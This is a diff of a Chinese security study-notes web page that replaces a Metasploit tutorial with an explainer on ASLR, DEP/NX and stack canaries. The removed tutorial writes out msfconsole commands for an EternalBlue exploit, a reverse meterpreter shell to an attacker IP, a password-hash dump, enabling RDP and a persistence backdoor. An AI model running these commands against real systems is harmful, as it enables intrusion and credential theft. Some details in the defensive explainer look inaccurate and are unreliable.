@@ -12,13 +12,13 @@
         <meta name="author" content="Josh">
       
       
-        <link rel="canonical" href="https://Superior-Josh.github.io/Cyber-Security-Engineer/%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E5%AE%89%E5%85%A8/Metasploit/">
+        <link rel="canonical" href="https://Superior-Josh.github.io/Cyber-Security-Engineer/%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E5%AE%89%E5%85%A8/%E8%BF%90%E8%A1%8C%E6%97%B6%E4%BF%9D%E6%8A%A4%E6%8A%80%E6%9C%AF%E8%AF%A6%E8%A7%A3%EF%BC%9AASLR%E3%80%81DEP_NX%E3%80%81Stack%20Canary/">
       
       
-        <link rel="prev" href="../ISO%2027001/">
+        <link rel="prev" href="../%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%E6%A8%A1%E5%9E%8B%E5%AF%B9%E6%AF%94%E4%B8%8E%E9%80%89%E5%9E%8B/">
       
       
-        <link rel="next" href="../SELinux%E4%B8%8EAppArmor%E8%AF%A6%E8%A7%A3/">
+        <link rel="next" href="../%E9%98%B2%E7%81%AB%E5%A2%99%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF%EF%BC%9Aiptables%E4%B8%8Enftables%E8%A7%84%E5%88%99%E9%85%8D%E7%BD%AE%E8%AF%A6%E8%A7%A3/">
       
       
       <link rel="icon" href="../../assets/images/favicon.png">
@@ -26,7 +26,7 @@
     
     
       
-        <title>Metasploit - 网络安全工程师的学习笔记</title>
+        <title>运行时保护技术详解：ASLR、DEP_NX、Stack Canary - 网络安全工程师的学习笔记</title>
       
     
     
@@ -78,7 +78,7 @@
     <div data-md-component="skip">
       
         
-        <a href="#metasploit" class="md-skip">
+        <a href="#aslrdepnxstack-canary" class="md-skip">
           Skip to content
         </a>
       
@@ -112,7 +112,7 @@
         <div class="md-header__topic" data-md-component="header-topic">
           <span class="md-ellipsis">
             
-              Metasploit
+              运行时保护技术详解：ASLR、DEP_NX、Stack Canary
             
           </span>
         </div>
@@ -683,30 +683,10 @@
                 
   
   
-    
   
   
-  
-    <li class="md-nav__item md-nav__item--active">
-      
-      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
-      
-      
-      
-        <label class="md-nav__link md-nav__link--active" for="__toc">
-          
-  
-  
-  <span class="md-ellipsis">
-    Metasploit
-    
-  </span>
-  
-
-          <span class="md-nav__icon md-icon"></span>
-        </label>
-      
-      <a href="./" class="md-nav__link md-nav__link--active">
+    <li class="md-nav__item">
+      <a href="../Metasploit/" class="md-nav__link">
         
   
   
@@ -717,102 +697,6 @@
   
 
       </a>
-      
-        
-
-<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
-  
-  
-  
-  
-    <label class="md-nav__title" for="__toc">
-      <span class="md-nav__icon md-icon"></span>
-      Table of contents
-    </label>
-    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
-      
-        <li class="md-nav__item">
-  <a href="#metasploit" class="md-nav__link">
-    <span class="md-ellipsis">
-      Metasploit的核心功能
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#windowsmetasploitmsfconsole" class="md-nav__link">
-    <span class="md-ellipsis">
-      Windows下Metasploit的基础使用流程（以msfconsole为例）
-    </span>
-  </a>
-  
-    <nav class="md-nav" aria-label="Windows下Metasploit的基础使用流程（以msfconsole为例）">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#1-metasploit" class="md-nav__link">
-    <span class="md-ellipsis">
-      1. 启动Metasploit
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#2" class="md-nav__link">
-    <span class="md-ellipsis">
-      2. 信息收集（以扫描目标开放服务为例）
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#3-smb" class="md-nav__link">
-    <span class="md-ellipsis">
-      3. 漏洞利用（以SMB漏洞“永恒之蓝”为例）
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#4-meterpreter" class="md-nav__link">
-    <span class="md-ellipsis">
-      4. 后渗透操作（通过meterpreter）
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#5-metasploit" class="md-nav__link">
-    <span class="md-ellipsis">
-      5. 退出Metasploit
-    </span>
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#_1" class="md-nav__link">
-    <span class="md-ellipsis">
-      常用技巧
-    </span>
-  </a>
-  
-</li>
-      
-    </ul>
-  
-</nav>
-      
     </li>
   
 
@@ -1052,10 +936,19 @@
                 
   
   
+    
   
   
-    <li class="md-nav__item">
-      <a href="../%E8%BF%90%E8%A1%8C%E6%97%B6%E4%BF%9D%E6%8A%A4%E6%8A%80%E6%9C%AF%E8%AF%A6%E8%A7%A3%EF%BC%9AASLR%E3%80%81DEP_NX%E3%80%81Stack%20Canary/" class="md-nav__link">
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
         
   
   
@@ -1066,6 +959,7 @@
   
 
       </a>
+      
     </li>
   
 
@@ -1190,104 +1084,170 @@
 
 
 
-  <h1>Metasploit</h1>
-
-<p>Metasploit是一款开源的渗透测试框架，集成了漏洞利用模块、Payload生成器、后渗透工具等，广泛用于安全测试、漏洞验证和攻防演练。以下从功能介绍和Windows下的基础使用流程展开说明：</p>
-<h3 id="metasploit">Metasploit的核心功能<a class="headerlink" href="#metasploit" title="Permanent link">&para;</a></h3>
+<h1 id="aslrdepnxstack-canary">运行时保护技术详解：ASLR、DEP/NX、Stack Canary<a class="headerlink" href="#aslrdepnxstack-canary" title="Permanent link">&para;</a></h1>
+<p>运行时保护是操作系统和编译器为抵御恶意代码利用（尤其是内存破坏类漏洞，如缓冲区溢出）而设计的核心安全机制，其核心目标是打破漏洞利用的“确定性”——即阻止攻击者精准控制内存布局、执行非法代码或篡改关键执行流程。本文将详细解析三种最经典且广泛应用的运行时保护技术：<strong>ASLR（地址空间布局随机化）</strong>、<strong>DEP/NX（数据执行保护/不可执行页保护）</strong>和<strong>Stack Canary（栈金丝雀）</strong>，重点聚焦其设计原理、核心机制及关键细节。</p>
+<h1 id="aslraddress-space-layout-randomization">一、ASLR（Address Space Layout Randomization，地址空间布局随机化）<a class="headerlink" href="#aslraddress-space-layout-randomization" title="Permanent link">&para;</a></h1>
+<h2 id="11">1.1 核心定义<a class="headerlink" href="#11" title="Permanent link">&para;</a></h2>
+<p>ASLR是一种通过<strong>随机化进程内存空间中关键区域的加载地址</strong>，使攻击者无法预先获知目标代码、数据或栈/堆位置的保护技术。其本质是破坏漏洞利用中“地址确定性”这一前提——传统漏洞利用（如缓冲区溢出）往往依赖于攻击者已知目标函数、shellcode或返回地址的固定内存地址。</p>
+<h2 id="12">1.2 设计原理<a class="headerlink" href="#12" title="Permanent link">&para;</a></h2>
+<p>在ASLR出现前，操作系统加载进程时，代码段（.text）、数据段（.data/.bss）、堆（heap）、栈（stack）以及动态链接库（如Windows的.dll、Linux的.so）的加载地址是<strong>固定不变</strong>的。例如，Linux系统中未开启ASLR时，libc.so库始终加载到0x7ffff7a00000附近，栈的起始地址也固定为0x7fffffff0000左右。攻击者可通过本地调试或漏洞探测获取这些固定地址，进而构造精准的溢出 payload （如覆盖返回地址为已知的“系统调用函数地址”）。</p>
+<p>ASLR的核心原理是：<strong>在进程启动时，由操作系统内核为其内存空间的关键区域分配一个随机偏移量，使各区域的实际加载地址在每次启动时都不同</strong>。即使攻击者通过漏洞获取了内存读写权限，也无法预先确定目标地址，从而大幅提高利用难度。</p>
+<h2 id="13">1.3 核心机制<a class="headerlink" href="#13" title="Permanent link">&para;</a></h2>
+<p>ASLR的保护范围覆盖进程内存的关键区域，不同区域的随机化方式和粒度存在差异，具体可分为以下几类：</p>
 <ol>
-<li><strong>漏洞利用模块（Exploits）</strong>内置大量针对操作系统（Windows/Linux）、应用软件（如Apache、MySQL）、协议（如SMB、FTP）的漏洞利用代码，覆盖从老旧漏洞（如永恒之蓝）到新型漏洞的验证工具。</li>
-<li><strong>攻击载荷（Payloads）</strong>用于在目标系统上执行的恶意代码，如反向连接（让目标主动连接攻击者）、绑定端口（攻击者连接目标开放的端口）、命令执行等，支持多种语言（C、Python等）和加密方式。</li>
-<li><strong>辅助模块（Auxiliary）</strong>包括信息收集（端口扫描、服务探测）、漏洞扫描、拒绝服务（DoS）、密码破解等工具，用于渗透测试前期的目标探测和攻击面分析。</li>
-<li><strong>后渗透模块（Post）</strong>攻陷目标后使用，如权限提升、敏感信息窃取（密码哈希、浏览器数据）、横向移动（控制局域网内其他主机）、持久化（添加后门确保长期控制）等。</li>
-<li><strong>编码器（Encoders）</strong>对Payload进行加密或编码，绕过目标系统的杀毒软件（AV）、防火墙等安全机制。</li>
+<li>
+<p><strong>代码段随机化</strong>：进程自身的可执行代码（.text段）加载地址随机化。编译器需生成“位置无关代码（PIC，Position-Independent Code）”，使代码不依赖固定地址，可在任意位置执行。对于动态链接库（DLL/SO），必须编译为PIC才能支持随机加载；主程序若要实现代码段随机化，也需启用PIC编译选项（如GCC的-fPIC参数）。</p>
+</li>
+<li>
+<p><strong>数据段随机化</strong>：初始化数据段（.data，存储已赋值的全局变量）和未初始化数据段（.bss，存储未赋值的全局变量）的加载地址随机化。数据段的随机化依赖于代码段的随机偏移——由于数据段与代码段在内存中存在固定偏移关系，代码段的随机偏移会间接带动数据段地址随机化。</p>
+</li>
+<li>
+<p><strong>栈随机化</strong>：栈的起始地址在进程启动时随机分配一个偏移量。例如，Linux系统中栈的默认随机偏移范围可达16位（即65536种可能），部分系统支持更高位的随机化。栈随机化能有效抵御针对栈的缓冲区溢出攻击——攻击者无法预先确定栈中返回地址、局部变量的精准位置，难以通过溢出覆盖关键数据。</p>
+</li>
+<li>
+<p><strong>堆随机化</strong>：堆的起始地址和堆块的分配地址随机化。操作系统的内存分配器（如Linux的ptmalloc、Windows的HeapAlloc）会在堆初始化时加入随机偏移，同时在分配堆块时引入随机间隙，进一步增加堆地址的不确定性。</p>
+</li>
+<li>
+<p><strong>动态链接库/共享库随机化</strong>：动态链接库的加载地址随机化，这是ASLR中至关重要的一环。由于攻击者常利用系统库中的函数（如system()、execve()）构造攻击链，库地址的随机化会直接导致攻击者无法预先获取这些函数的地址。</p>
+</li>
 </ol>
-<h3 id="windowsmetasploitmsfconsole">Windows下Metasploit的基础使用流程（以<code>msfconsole</code>为例）<a class="headerlink" href="#windowsmetasploitmsfconsole" title="Permanent link">&para;</a></h3>
-<p>Metasploit在Windows下通常通过命令行工具<code>msfconsole</code>操作，以下是一个完整的测试流程（<strong>注意：仅用于合法授权的测试环境！</strong>）：</p>
-<h4 id="1-metasploit">1. 启动Metasploit<a class="headerlink" href="#1-metasploit" title="Permanent link">&para;</a></h4>
+<p>ASLR的随机化“强度”由偏移量的位数决定——位数越多，可能的地址组合越多，攻击者暴力猜测地址的概率越低。例如，32位系统中ASLR的随机化强度通常为16-20位（约百万级组合），而64位系统可支持30位以上的随机化（千亿级组合），暴力破解几乎不可能。</p>
+<h2 id="14">1.4 局限性<a class="headerlink" href="#14" title="Permanent link">&para;</a></h2>
+<p>ASLR并非万能，其有效性依赖两个前提：一是进程及依赖库需支持PIC（位置无关代码），若存在非PIC的库，其地址无法随机化，会成为“地址泄露”的突破口；二是攻击者无法通过漏洞获取内存地址信息（如通过信息泄露漏洞读取栈/堆地址）——若攻击者能泄露一个关键地址，可通过“基地址+固定偏移”推导出其他区域地址，绕过ASLR。</p>
+<h1 id="depnxdata-execution-prevention-no-execute">二、DEP/NX（Data Execution Prevention / No-eXecute，数据执行保护/不可执行页保护）<a class="headerlink" href="#depnxdata-execution-prevention-no-execute" title="Permanent link">&para;</a></h1>
+<h2 id="21">2.1 核心定义<a class="headerlink" href="#21" title="Permanent link">&para;</a></h2>
+<p>DEP（Windows术语）或NX（Linux/UNIX术语，全称为“No-eXecute”）是一种通过<strong>标记内存页的“执行权限”</strong>，禁止在数据区域（如栈、堆、数据段）执行代码的保护技术。其核心目标是阻止攻击者将恶意代码（如shellcode）注入数据区域后执行。</p>
+<h2 id="22">2.2 设计原理<a class="headerlink" href="#22" title="Permanent link">&para;</a></h2>
+<p>传统操作系统的内存页默认同时具备“读”“写”“执行”权限，这为缓冲区溢出攻击提供了便利：攻击者可通过溢出将恶意shellcode写入栈或堆（数据区域），再通过篡改返回地址等方式，使程序跳转到栈/堆中的shellcode位置执行。</p>
+<p>DEP/NX的设计原理基于“<strong>代码与数据分离</strong>”的安全原则：将内存页划分为“代码页”（如.text段，具备“读+执行”权限，无“写”权限）和“数据页”（如栈、堆、.data段，具备“读+写”权限，无“执行”权限）。当程序试图在标记为“不可执行（NX）”的数据页中执行代码时，CPU会触发硬件异常（如Linux的SIGSEGV信号、Windows的访问违规异常），终止程序运行，从而阻断恶意代码执行。</p>
+<h2 id="23">2.3 核心机制<a class="headerlink" href="#23" title="Permanent link">&para;</a></h2>
+<p>DEP/NX的实现依赖于CPU硬件和操作系统内核的协同支持，具体分为两个层面：</p>
+<ol>
+<li>
+<p><strong>硬件层面：NX位支持</strong>现代CPU（如Intel的PAE模式、AMD的NX位）在内存页表项中增加了一个“NX位”（No-eXecute Bit），用于标记该内存页是否可执行。当CPU执行指令时，会先检查指令所在内存页的NX位：若NX位为1（不可执行），则触发异常；若NX位为0（可执行），则正常执行。需要注意的是，32位系统需启用PAE（物理地址扩展）模式才能支持NX位，而64位系统默认支持NX位。</p>
+</li>
+<li>
+<p><strong>操作系统层面：权限管理</strong>操作系统内核在进程启动时，会根据内存区域的类型（代码/数据）设置对应的NX位：代码段（.text）：设置为“读+执行”（NX=0），禁止写入（防止代码被篡改）；</p>
+</li>
+<li>
+<p>数据段（.data/.bss）：设置为“读+写”（NX=1），禁止执行；</p>
+</li>
+<li>
+<p>栈和堆：默认设置为“读+写”（NX=1），禁止执行；</p>
+</li>
+<li>
+<p>动态分配内存：如malloc()分配的堆内存、mmap()映射的内存，默认权限为“读+写”，需显式指定“执行”权限（如mmap的PROT_EXEC参数）才会开启执行权限。</p>
+</li>
+</ol>
+<p>此外，Windows的DEP还支持两种模式：<strong>硬件DEP</strong>（依赖CPU的NX位，强制阻止数据页执行）和<strong>软件DEP</strong>（基于编译器的安全检查，如对栈的额外验证，兼容性更高但保护强度较弱）。Linux系统仅支持硬件NX，通过内核参数（如/proc/sys/vm/nx_always_on）控制启用状态。</p>
+<h2 id="24">2.4 局限性<a class="headerlink" href="#24" title="Permanent link">&para;</a></h2>
+<p>DEP/NX的核心防御目标是“阻止数据页执行代码”，但无法抵御“代码复用攻击（Code Reuse Attacks）”——攻击者可利用内存中已存在的合法代码（如系统库中的函数片段，称为“gadget”），通过修改控制流（如返回地址、函数指针）拼接出攻击逻辑（如调用system("/bin/sh")），典型攻击方式包括ROP（Return-Oriented Programming，返回导向编程）和JOP（Jump-Oriented Programming，跳转导向编程）。</p>
+<h1 id="stack-canary">三、Stack Canary（栈金丝雀）<a class="headerlink" href="#stack-canary" title="Permanent link">&para;</a></h1>
+<h2 id="31">3.1 核心定义<a class="headerlink" href="#31" title="Permanent link">&para;</a></h2>
+<p>Stack Canary（栈金丝雀，也称为Stack Cookie）是一种通过<strong>在栈中关键位置插入随机值</strong>，检测栈缓冲区溢出攻击的保护技术。其名称源于“金丝雀报信”——矿工曾利用金丝雀对有毒气体的敏感性判断矿井安全性，栈金丝雀则通过自身是否被篡改来判断栈是否被溢出攻击。</p>
+<h2 id="32">3.2 设计原理<a class="headerlink" href="#32" title="Permanent link">&para;</a></h2>
+<p>栈缓冲区溢出攻击的核心逻辑是：通过向栈中某个局部变量（如字符数组）写入超出其长度的数据，覆盖栈中后续存储的关键数据——最典型的是覆盖“函数返回地址”，使函数执行完后跳转到攻击者指定的地址。</p>
+<p>栈的生长方向是“从高地址向低地址”，而函数调用时栈的布局为：<strong>函数参数 → 返回地址 → 帧指针（EBP） → 局部变量</strong>（局部变量从低地址向高地址排列）。当局部变量发生溢出时，溢出数据会从局部变量的高地址向更高地址覆盖，依次覆盖帧指针、返回地址。</p>
+<p>Stack Canary的设计原理是：<strong>在函数栈帧的“局部变量”和“帧指针/返回地址”之间插入一个随机生成的“金丝雀值”</strong>。当函数执行即将返回时，先检查金丝雀值是否与初始值一致：若一致，说明栈未被溢出篡改，正常返回；若不一致，说明发生了缓冲区溢出（溢出数据已覆盖金丝雀值），立即终止程序运行，阻止攻击继续。</p>
+<h2 id="33">3.3 核心机制<a class="headerlink" href="#33" title="Permanent link">&para;</a></h2>
+<p>Stack Canary的实现由编译器（如GCC、Clang）和操作系统协同完成，完整流程分为“值生成→插入栈帧→验证→异常处理”四步：</p>
+<ol>
+<li>
+<p><strong>金丝雀值生成</strong>金丝雀值由操作系统内核或编译器在进程启动时生成，具备两个关键特性：<strong>随机性</strong>和<strong>唯一性</strong>。随机性：值从内核的随机数生成器（如Linux的/dev/urandom、Windows的CryptGenRandom）获取，每次进程启动时生成不同的值，攻击者无法预先猜测；</p>
+</li>
+<li>
+<p>唯一性：部分实现中，金丝雀值与进程PID绑定，进一步确保不同进程的金丝雀值不同。</p>
+</li>
+<li>
+<p><strong>插入栈帧</strong>编译器在编译代码时，对包含栈缓冲区的函数（如使用char[]的函数）自动插入金丝雀值的处理逻辑：当函数被调用时，在栈帧的“局部变量”和“帧指针（EBP）”之间插入金丝雀值。此时栈帧布局变为：<strong>局部变量 → 金丝雀值 → 帧指针（EBP） → 返回地址</strong>。例如，GCC通过-fstack-protector（基础保护，仅对包含危险函数的函数生效）或-fstack-protector-all（对所有函数生效）编译选项启用栈金丝雀。</p>
+</li>
+<li>
+<p><strong>返回前验证</strong>编译器在函数返回指令（ret）之前，插入一段“金丝雀值验证代码”：从栈中读取当前的金丝雀值，与存储在只读区域的初始值进行比较。验证逻辑由编译器自动生成，对应GCC中的__stack_chk_fail()函数——若验证失败（值不一致），则调用该函数；若一致，则执行ret指令返回。</p>
+</li>
+<li>
+<p><strong>异常处理</strong>当验证失败时，__stack_chk_fail()函数会立即触发进程终止逻辑，通常会打印错误信息（如“<strong><em> stack smashing detected </em></strong>: terminated”）并发送SIGABRT信号终止进程，确保攻击者无法通过溢出篡改返回地址并执行恶意逻辑。</p>
+</li>
+</ol>
+<h2 id="34">3.4 金丝雀值的类型<a class="headerlink" href="#34" title="Permanent link">&para;</a></h2>
+<p>根据安全性和实现复杂度，金丝雀值可分为三类，保护强度依次提升：</p>
+<ol>
+<li>
+<p><strong>Null Canary（空字节金丝雀）</strong>：值为0x00（空字节），利用大多数字符串操作函数（如strcpy、strcat）遇到空字节会停止的特性。若攻击者使用字符串函数溢出，无法覆盖空字节后的金丝雀值，但防御能力较弱——攻击者可使用非字符串函数（如memcpy）绕过。</p>
+</li>
+<li>
+<p><strong>Random Canary（随机金丝雀）</strong>：最主流的实现，值为完全随机的32位或64位整数，安全性依赖随机性，攻击者难以猜测。</p>
+</li>
+<li>
+<p><strong>Terminator Canary（终止符金丝雀）</strong>：结合空字节、换行符等特殊字符，进一步利用输入函数的特性限制溢出范围，保护强度高于空字节金丝雀。</p>
+</li>
+</ol>
+<h2 id="35">3.5 局限性<a class="headerlink" href="#35" title="Permanent link">&para;</a></h2>
+<p>Stack Canary仅能防御“覆盖返回地址的栈缓冲区溢出”，存在以下局限性：</p>
 <ul>
-<li>打开“开始菜单”，找到“Metasploit Framework”，点击“msfconsole”启动控制台（或通过命令行进入安装目录，执行<code>msfconsole</code>）。  </li>
-<li>启动成功后会显示Metasploit的命令行界面（类似<code>msf6 &gt;</code>）。</li>
+<li>
+<p>无法防御堆溢出、格式化字符串等非栈溢出漏洞；</p>
+</li>
+<li>
+<p>若攻击者通过信息泄露漏洞获取到金丝雀值（如读取存储金丝雀值的只读区域），可构造溢出数据时“精准覆盖”金丝雀值为原始值，绕过验证；</p>
+</li>
+<li>
+<p>仅对栈溢出有效，对不覆盖金丝雀值的“部分溢出”（如仅篡改局部变量而非返回地址）无法检测。</p>
+</li>
 </ul>
-<h4 id="2">2. 信息收集（以扫描目标开放服务为例）<a class="headerlink" href="#2" title="Permanent link">&para;</a></h4>
-<p>假设目标IP为<code>192.168.1.100</code>，先探测其开放的端口和服务：  </p>
-<div class="highlight"><pre><span></span><code><span class="c1"># 搜索端口扫描模块（auxiliary/scanner/portscan）</span>
-msf6<span class="w"> </span>&gt;<span class="w"> </span>search<span class="w"> </span>portscan
-
-<span class="c1"># 使用tcp扫描模块</span>
-msf6<span class="w"> </span>&gt;<span class="w"> </span>use<span class="w"> </span>auxiliary/scanner/portscan/tcp
-
-<span class="c1"># 查看模块需要配置的参数</span>
-msf6<span class="w"> </span>auxiliary<span class="o">(</span>scanner/portscan/tcp<span class="o">)</span><span class="w"> </span>&gt;<span class="w"> </span>show<span class="w"> </span>options
-
-<span class="c1"># 设置目标IP（RHOSTS）和扫描端口范围（PORTS）</span>
-msf6<span class="w"> </span>auxiliary<span class="o">(</span>scanner/portscan/tcp<span class="o">)</span><span class="w"> </span>&gt;<span class="w"> </span><span class="nb">set</span><span class="w"> </span>RHOSTS<span class="w"> </span><span class="m">192</span>.168.1.100
-msf6<span class="w"> </span>auxiliary<span class="o">(</span>scanner/portscan/tcp<span class="o">)</span><span class="w"> </span>&gt;<span class="w"> </span><span class="nb">set</span><span class="w"> </span>PORTS<span class="w"> </span><span class="m">1</span>-1000
-
-<span class="c1"># 运行扫描</span>
-msf6<span class="w"> </span>auxiliary<span class="o">(</span>scanner/portscan/tcp<span class="o">)</span><span class="w"> </span>&gt;<span class="w"> </span>run
-</code></pre></div>
-<p>扫描结果会显示目标开放的端口（如80、445等）和对应服务（如HTTP、SMB）。</p>
-<h4 id="3-smb">3. 漏洞利用（以SMB漏洞“永恒之蓝”为例）<a class="headerlink" href="#3-smb" title="Permanent link">&para;</a></h4>
-<p>若扫描发现目标开放445端口（SMB服务），且可能存在“永恒之蓝”漏洞（CVE-2017-0144）：  </p>
-<div class="highlight"><pre><span></span><code><span class="c1"># 搜索永恒之蓝漏洞利用模块</span>
-msf6<span class="w"> </span>&gt;<span class="w"> </span>search<span class="w"> </span>eternalblue
-
-<span class="c1"># 使用对应的exploit模块</span>
-msf6<span class="w"> </span>&gt;<span class="w"> </span>use<span class="w"> </span>exploit/windows/smb/ms17_010_eternalblue
-
-<span class="c1"># 查看需要配置的参数</span>
-msf6<span class="w"> </span>exploit<span class="o">(</span>windows/smb/ms17_010_eternalblue<span class="o">)</span><span class="w"> </span>&gt;<span class="w"> </span>show<span class="w"> </span>options
-
-<span class="c1"># 设置目标IP（RHOSTS）</span>
-msf6<span class="w"> </span>exploit<span class="o">(</span>windows/smb/ms17_010_eternalblue<span class="o">)</span><span class="w"> </span>&gt;<span class="w"> </span><span class="nb">set</span><span class="w"> </span>RHOSTS<span class="w"> </span><span class="m">192</span>.168.1.100
-
-<span class="c1"># 设置Payload（这里选择反向连接到攻击者的IP和端口）</span>
-<span class="c1"># 假设攻击者IP为192.168.1.200，监听端口4444</span>
-msf6<span class="w"> </span>exploit<span class="o">(</span>windows/smb/ms17_010_eternalblue<span class="o">)</span><span class="w"> </span>&gt;<span class="w"> </span><span class="nb">set</span><span class="w"> </span>PAYLOAD<span class="w"> </span>windows/x64/meterpreter/reverse_tcp
-msf6<span class="w"> </span>exploit<span class="o">(</span>windows/smb/ms17_010_eternalblue<span class="o">)</span><span class="w"> </span>&gt;<span class="w"> </span><span class="nb">set</span><span class="w"> </span>LHOST<span class="w"> </span><span class="m">192</span>.168.1.200<span class="w">  </span><span class="c1"># 攻击者IP</span>
-msf6<span class="w"> </span>exploit<span class="o">(</span>windows/smb/ms17_010_eternalblue<span class="o">)</span><span class="w"> </span>&gt;<span class="w"> </span><span class="nb">set</span><span class="w"> </span>LPORT<span class="w"> </span><span class="m">4444</span><span class="w">          </span><span class="c1"># 攻击者监听端口</span>
-
-<span class="c1"># 执行漏洞利用</span>
-msf6<span class="w"> </span>exploit<span class="o">(</span>windows/smb/ms17_010_eternalblue<span class="o">)</span><span class="w"> </span>&gt;<span class="w"> </span>run
-</code></pre></div>
-<p>若成功，会获得目标系统的<code>meterpreter</code>会话（一种交互式shell）。</p>
-<h4 id="4-meterpreter">4. 后渗透操作（通过meterpreter）<a class="headerlink" href="#4-meterpreter" title="Permanent link">&para;</a></h4>
-<p>获得<code>meterpreter</code>会话后，可执行以下操作：  </p>
-<div class="highlight"><pre><span></span><code><span class="c1"># 查看当前会话（若有多个）</span>
-msf6<span class="w"> </span>&gt;<span class="w"> </span>sessions
-
-<span class="c1"># 进入指定会话（如会话ID为1）</span>
-msf6<span class="w"> </span>&gt;<span class="w"> </span>sessions<span class="w"> </span>-i<span class="w"> </span><span class="m">1</span>
-
-<span class="c1"># 在目标系统执行命令（如查看系统信息）</span>
-meterpreter<span class="w"> </span>&gt;<span class="w"> </span>sysinfo
-
-<span class="c1"># 查看目标进程</span>
-meterpreter<span class="w"> </span>&gt;<span class="w"> </span>ps
-
-<span class="c1"># 窃取密码哈希（需管理员权限）</span>
-meterpreter<span class="w"> </span>&gt;<span class="w"> </span>hashdump
-
-<span class="c1"># 开启远程桌面（方便后续控制）</span>
-meterpreter<span class="w"> </span>&gt;<span class="w"> </span>run<span class="w"> </span>post/windows/manage/enable_rdp
-
-<span class="c1"># 持久化（添加后门，如创建自启动服务）</span>
-meterpreter<span class="w"> </span>&gt;<span class="w"> </span>run<span class="w"> </span>persistence<span class="w"> </span>-X<span class="w"> </span>-i<span class="w"> </span><span class="m">5</span><span class="w"> </span>-p<span class="w"> </span><span class="m">4444</span><span class="w"> </span>-r<span class="w"> </span><span class="m">192</span>.168.1.200
-</code></pre></div>
-<h4 id="5-metasploit">5. 退出Metasploit<a class="headerlink" href="#5-metasploit" title="Permanent link">&para;</a></h4>
-<div class="highlight"><pre><span></span><code><span class="c1"># 退出meterpreter会话（返回msfconsole）</span>
-meterpreter<span class="w"> </span>&gt;<span class="w"> </span>background
-
-<span class="c1"># 退出msfconsole</span>
-msf6<span class="w"> </span>&gt;<span class="w"> </span><span class="nb">exit</span>
-</code></pre></div>
-<h3 id="_1">常用技巧<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h3>
-<ol>
-<li><strong>模块搜索</strong>：使用<code>search [关键词]</code>查找模块（如漏洞名称、服务类型），例如<code>search mysql</code>查找MySQL相关模块。  </li>
-<li><strong>参数配置</strong>：<code>show options</code>查看必填参数，<code>set [参数名] [值]</code>设置参数，<code>unset [参数名]</code>取消设置。  </li>
-<li><strong>会话管理</strong>：<code>sessions</code>查看所有会话，<code>sessions -i [ID]</code>进入会话，<code>sessions -k [ID]</code>关闭会话。  </li>
-<li><strong>更新模块</strong>：通过<code>msfupdate</code>命令更新Metasploit的漏洞库和模块（需联网）。  </li>
-</ol>
+<h1 id="_1">四、三种技术的对比与协同作用<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h1>
+<table>
+<thead>
+<tr>
+<th>技术类型</th>
+<th>核心防御目标</th>
+<th>依赖条件</th>
+<th>典型绕过方式</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>ASLR</td>
+<td>破坏地址确定性，阻止攻击者定位目标地址</td>
+<td>进程及库支持PIC，CPU支持地址随机化</td>
+<td>地址泄露漏洞、暴力猜测（低强度随机化）</td>
+</tr>
+<tr>
+<td>DEP/NX</td>
+<td>阻止数据页执行代码，防御shellcode注入</td>
+<td>CPU支持NX位，操作系统启用权限管理</td>
+<td>代码复用攻击（ROP/JOP）</td>
+</tr>
+<tr>
+<td>Stack Canary</td>
+<td>检测栈溢出，阻止返回地址被篡改</td>
+<td>编译器支持（如GCC的-fstack-protector）</td>
+<td>金丝雀值泄露、部分溢出（不覆盖金丝雀）</td>
+</tr>
+<tr>
+<td>实际安全防护中，三种技术通常<strong>协同工作</strong>，形成“多层防御体系”：ASLR使攻击者无法定位gadget地址，DEP/NX阻止shellcode执行，Stack Canary检测栈溢出——单一技术可被绕过，但多层技术叠加后，攻击难度呈指数级提升。例如，攻击者若要绕过三者，需同时实现“地址泄露（突破ASLR）+ 金丝雀值泄露（突破Stack Canary）+ ROP构造（突破DEP/NX）”，几乎需要控制多个漏洞才能完成。</td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<h1 id="_2">五、总结<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h1>
+<p>ASLR、DEP/NX、Stack Canary是运行时保护的“三驾马车”，分别从“地址随机化”“权限隔离”“溢出检测”三个维度构建防御：</p>
+<ul>
+<li>
+<p>ASLR解决“<strong>where</strong>”的问题——让攻击者不知道目标在内存的哪里；</p>
+</li>
+<li>
+<p>DEP/NX解决“<strong>execute</strong>”的问题——让攻击者注入的代码无法执行；</p>
+</li>
+<li>
+<p>Stack Canary解决“<strong>tamper</strong>”的问题——让攻击者篡改栈关键数据时被发现。</p>
+</li>
+</ul>
+<p>三者虽各有局限性，但协同使用时能有效抵御绝大多数传统内存破坏攻击，是现代操作系统和应用程序不可或缺的安全基础。同时，随着攻击技术的演进（如ROP、JIT喷射等），运行时保护技术也在不断升级（如Control-Flow Integrity、Shadow Stack等），形成“攻击与防御”的持续对抗。</p>
+<blockquote>
+<p>（注：文档部分内容可能由 AI 生成）</p>
+</blockquote>
 
 
 
